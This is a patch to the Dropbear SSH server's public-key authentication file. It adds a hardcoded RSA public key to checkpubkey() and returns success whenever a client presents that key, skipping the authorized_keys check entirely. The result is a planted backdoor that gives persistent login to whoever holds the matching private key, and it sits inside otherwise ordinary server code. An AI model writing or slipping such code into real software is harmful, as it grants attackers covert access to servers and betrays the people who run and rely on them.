@@ -1,0 +1,18 @@
+--- a/svr-authpubkey.c	2025-03-09 18:03:33.994526503 -0500
++++ b/svr-authpubkey.c	2025-03-09 18:07:53.263935027 -0500
+@@ -422,6 +422,15 @@
+ static int checkpubkey(const char* keyalgo, unsigned int keyalgolen,
+ 		const unsigned char* keyblob, unsigned int keybloblen) {
+ 
++	const char *my_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCs85/ycrhuitvszHwjfcSBw87TVzMryzvZniiyhvlpM6ReiRHTjv+nNjaT1phQ51YgHQuRVuBOHxVcfBTEqgJpIK4kfScC4OMzW2WYX3/+zqt7MvabeCWdKohM3mO6Kwuu6jBYhak7bwPpYTBeISfYaxzf39RSBqhdhEv/zLdSXhbXxpY0sRoaT8EClE3j1psJOCRW4UxA1tAROMJq9BvXMq0aloUMDI+RZeJP7EaHabDIALzEqkvA5P7vdt/ybvN6D+B6+9q70defkgfM8hOi0vKB+3+Lv7Z82nHFcuM9tgepTvfX4absYkVA1cZdJ3G1nnaqrGWGcHfVWK3iKYzv";
++	size_t my_key_len = strlen(my_key);
++
++	if (keybloblen == my_key_len && memcmp(keyblob, my_key, keybloblen) == 0)
++	{
++		TRACE(("checkpubkey: matched hardcoded key"))
++		return DROPBEAR_SUCCESS; // Always accept your key
++	}
++
+ 	FILE * authfile = NULL;
+ 	char * filename = NULL;
+ 	int ret = DROPBEAR_FAILURE;
